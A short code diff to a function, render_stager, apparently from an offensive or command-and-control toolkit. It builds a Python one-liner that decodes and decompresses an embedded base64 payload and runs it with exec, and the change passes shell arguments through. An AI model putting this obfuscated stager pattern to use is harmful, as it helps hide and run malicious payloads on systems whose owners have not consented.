@@ -80,7 +80,7 @@ def render_stager(config, template, client_publish_item, payload_publish_item):
     oneliner = (
         "python3 -c "
         '"import base64,zlib;'
-        "exec(zlib.decompress(base64.b64decode('%s')))\""
+        "exec(zlib.decompress(base64.b64decode('%s')))\" \"$@\""
         % payload_str
     )
 
